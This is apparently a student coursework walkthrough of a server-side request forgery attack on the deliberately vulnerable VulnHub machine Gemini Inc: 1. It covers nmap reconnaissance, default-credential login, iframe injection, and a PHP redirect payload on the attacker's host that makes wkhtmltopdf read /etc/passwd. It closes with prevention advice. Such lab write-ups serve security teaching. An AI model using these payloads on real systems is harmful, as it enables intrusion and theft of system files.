# CSCM28-Coursework 2
## Identification, Exploitation and Prevention of SSRF Vulnerability
> [Github Link](https://github.com/avhiaryal/ssrf-exploitation/edit/main/README.md) 
> Note: `You can find all the necessary links at the bottom of this file too.`

This demonstration will show the identification, exploitation, and possible ways to prevent SSRF vulnerability. For this demo a vulnerable virtual machine image provided by [VulnHub](https://www.vulnhub.com/) called **GEMINI INC: 1** is used.

****
**The system used to perform this lab:**
- OS – Microsoft Windows 11 Home -> You can use Linux like Kali Linux or Ubuntu too
- Processor – AMD Ryzen 7 5800H 8 Cores 16 Threads
- Memory (RAM) – 16.0 GB; Virtual Memory – 30.9 GB
- VMWare Pro Workstation
- 2 Virtual machines (Kali as an attacking machine and Gemini Inc 1 as a victim machine)

**Minimum System Requirement** 
- A compatible 64-bit x86/AMD64 CPU launched in 2011 or later.
- 3GHz or faster core speed.
- 2GB RAM minimum/ 4GB RAM or more recommended.

## Setting Up the Lab
Follow the following steps to setup the lab for demonstration:
- Get a Virtualization Software such as VMWare [Download VMWare](https://www.vmware.com/uk/products/workstation-pro/workstation-pro-evaluation.html) to host the attacking machine and victim machine. [You can also use other software such as VirtualBox]
    - The attacker machine used is Kali Linux which can be downloaded from this link. [Kali Linux VMWare Machine](https://www.kali.org/get-kali/#kali-virtual-machines)
    - The victim machine used is GEMINI INC: 1, provided by VulnHub which can be downloaded from this link. [GEMINI INC:1](https://www.vulnhub.com/entry/gemini-inc-1,227/)
- Import these machines to VMWare. 

    ```sh
    - Open the VMWare software 
    - Click on File 
    - Click on Open
    - Browse and add your virtual machine image to the VMWare. 
    ```
***The importing of vulnerable virtual images is very straightforward but in case you get stuck; you can always view the documentation available here [Installation Documentation](https://www.kali.org/docs/virtualization/).***

```The attacking machine and vulnerable virtual machine are preconfigured to use the IP address automatically (DHCP), so no additional configuration is required. But since we are dealing with a vulnerable machine, configure the Network Adapter to use “NAT” which can be configured from the setting option of the virtual machine. After importing the virtual machine image, run the machines.```

## Information Gathering (Active Reconnaissance)
Now both the machines are up and running start with the active reconnaissance of the vulnerable machine. Perform the following steps in the attacking machine i.e., Kali Machine.
### Discovery of the HOST
- Identifying the victim machine in the network (This will determine the IP address of the victim machine) using a built-in tool ```netdiscover```.
 ```sh
netdiscover -r <host_ip_range>/24
e.g.: netdiscover -r 192.168.189.0/24
```
- You can easily determine the ip address of Gemini Inc 1 as only two machines are using same virtual network inside VMWare.

### Discovery of the Services in Victim Machine
- Identify available services in the host. (Using the ip address of victim machine discovered above) by using another built in tool```nmap```.
```sh
nmap -sS -Pn -T4 -p- -A <victim_ip_address>
-sS -> TCP SYN port scan
-Pn -> Only scan port and disable host discovery.
-T4 -> Aggressive (4) speeds scans
-p- -> scan all ports
-A -> Detect OS, version, script scanning, and traceroute
```
- Once the scan is complete you will find two ***open ports*** ```22/TCP``` and ```80/TCP``` with a directory ```test2 in port 80```.

## Enumeration
- Enumerate the port 80 by visiting the directory in the browser of attacking machine i.e., Kali Linux
```sh
<victim_ip>/test2
```
***Similar webpage is expected if everything is done correctly.***

![GEMINI INC WEBPAGE](https://github.com/avhiaryal/ssrf-exploitation/blob/main/WebPage.png?raw=true)

- You can see that this web application was built and modified from the open-source project called ***[Master Login System](https://github.com/ionutvmi/master-login-system)***  (An open sourceappliction). Visit this project to find any important information.
- You can see some important installation files like ***install.php, profile.php, user.php*** which may content very important information.
```Upon close inspection of the source code in install.php, you will see that a default administrator account is created when we install this application and credentials of admin account is also shown.```

![Vulnerable Code](https://github.com/avhiaryal/ssrf-exploitation/blob/main/vulnerable_source_code_1.png?raw=true)

> USER: admin
> PASSWORD: 1234

## Exploiting and Gaining Access
- Use those credentials to login to that application.
- Once logged in you can view the admin profile from the dropdown from the navbar; 
```The profile page contains few important information like email of admin and two different features under Actions dropdown:``` 
```sh
Edit profile
```
```sh
Export profile
```
- Explore these functions and see any interesting information can be found. 
- There are some input fields in ***Edit profile*** which can be tested against injectable parameters
```Interestingly in Display Name field you can perform html injection```
Try:
	```sh
    <h1>Your Input</h1>
    ```
> You will see that it is successfully reflected when you save and view the profile page. 

```This indicated that the web application is vulnerable to SSRF attack via HTML Injection.```
- Analysing the source code of ***user.php***, you will see that the ***Display name*** and ***Email*** are not validated hence any user-supplied input will be reflected on ***profile.php*** and ***export.php***
```sh
$email = $_POST['email'];
$display_name = $_POST['display_name'];
.
.
if(!isset($page->error) && $db->query("UPDATE `".MLS_PREFIX."users` SET `email` = ?s, `display_name` = ?s ?p WHERE `userid` = ?i", $email, $display_name, $extra, $u->userid))
```
```The server when receives the request to change the display name it is not validating the user input and hence vulnerable to Server-Side Request Forgery```

## Further Exploitation
- Attempt to connect to the vulnerable machine by performing a simple TCP listener:
***In your kali machine:***
```sh
nc -nlvp 7777
```
- In Display name field of Gemini Inc web page edit profile page using the iframe injection code:
```sh
<iframe scr=htttps://kali_machine_ip_address:7777></iframe>
```
- Save and go back to profile page. You will see that a successful connection is establish and you will get similar response:

![Netcat Response](https://github.com/avhiaryal/ssrf-exploitation/blob/main/response.png?raw=true)
```And if you try to export the pdf you will also find a pdf converter called wkhtmltopdf in useragent```
![Vulnerble Converter](https://github.com/avhiaryal/ssrf-exploitation/blob/main/pdfconverter.png?raw=true)

- Look for known any issues with this converter you may come across this GitHub Page with Issue #3570: [SSRF and file read with wkhtmltoimage](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570)
Upon further investigating with basic google search, you can find a exploit with the above issue [HERE](https://github.com/crackatoa/kertasgorengan/blob/master/catatan/SSRF%20wkhtml.md)
So, to exploit this SSRF vulnerability, create a php file let’s say ***ssrftest.php*** inside ***/var/www/html***
```sh
<?php
	$file = $_GET[‘file’];
	header(“location:file://$file”);
?>
```
On victim webpage inject the following code in Display name input field
```sh
<iframe src='http://kali_machine_ip_addr/ssrftest.php?file=/etc/passwd'></iframe>
```
```This will retrieve the internal /etc/passwd file from the vulnerable machine```.

## Preventation (Patching)

> Occurance: `Common`
> Exploitability: `Easy`
> Impact: `Harmful`

```WHAT WE CAN DO?```

- ##### Domain of the HTTP Call should be defines in the server-side and not pulled from the client-side
- ##### External Validations URLs should be disabled
- ##### Maintain a blocklist of domain that are never accessed in server-side requests (both in configuration file and in database)
    - It will interupts malicious requests and also stop any DoS attacks attempt.  
    
        ```sh
         if components.netloc in BLOCKLIST:
        raise Exception("Link Sharing is not allowed")
        ```
    
- #### Validate the URLs that are accessed by the user or the server.
    -  Make sure that the server-side request are to publicly accessible URLs only.
    -  Validate if the URLs contain web domains rather than IP address.
    
        ```sh
        try:
            IP(str)
            raise Exception("IP address not allowed, Please Specify Domain Name")
        except ValueError:
            pass
        ```
    -  Only vaidate URLs with standard ports and protocols.
        ```sh
        if ':' in components.netloc:
        raise Exception("Port Specification Not Allowed")
        ```
        ```sh
        if components.scheme not in ("http", "https"):
        raise Exception("Invalid protocol")
        ```
        Add a protocol is not supplied:
        ```sh
        link = link.lower()
        link = link if re.match("^[a-z]+://.*", link) else f"https://{link}"
        ```
    -  Make sure that the URLs are accessed over HTTPS (valid certificates).
    -  Only allow authenticated user to make outgoing HTTP request form the server.

In the context of SSRF, validations can be added to ensure that the input string respects the business/technical format expected. ***Source:*** [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
```Regex validation for a data having a simple format```
```sh
if(Pattern.matches("[a-zA-Z0-9\\s\\-]{1,50}", userInput)){
    //Continue the processing because the input data is valid
}else{
    //Stop the processing and reject the request
}
```


Resources and useful links used for this demonstration

| Resources |
| ------ |
| [VulHub](https://www.vulnhub.com/) |
| [GEMINI INC:1](https://www.vulnhub.com/entry/gemini-inc-1,227/) |
| [Kali Linux](https://www.kali.org/get-kali/#kali-virtual-machines)
| [VMware](https://www.vmware.com/uk/products/workstation-pro/workstation-pro-evaluation.html) |
| [wkhtmltopdf issue](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570) |
| [wkhtmltopdf exploit](https://github.com/crackatoa/kertasgorengan/blob/master/catatan/SSRF%20wkhtml.md) |
| [Virtual Machine Installation Documentation](https://www.kali.org/docs/virtualization/)|
|[NMap Cheet Sheet](https://www.stationx.net/nmap-cheat-sheet/)|

> Author: `2152259-2149290` 
